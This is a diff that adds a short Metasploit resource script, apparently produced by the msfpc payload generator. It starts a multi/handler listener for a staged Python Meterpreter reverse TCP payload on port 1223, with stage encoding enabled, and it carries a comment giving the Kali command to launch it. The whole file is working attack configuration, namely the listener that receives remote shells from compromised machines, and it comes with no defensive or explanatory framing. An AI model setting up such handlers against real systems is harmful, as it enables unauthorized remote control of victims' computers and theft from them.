@@ -1,0 +1,11 @@
+#
+# [Kali]: msfdb start; msfconsole -q -r '/home/kali/Desktop/msfpc/python-meterpreter-staged-reverse-tcp-1223-py.rc'
+#
+use exploit/multi/handler
+set PAYLOAD python/meterpreter/reverse_tcp
+set LHOST 127.0.0.2
+set LPORT 1223
+set ExitOnSession false
+set EnableStageEncoding true
+#set AutoRunScript 'post/windows/manage/migrate'
+run -j
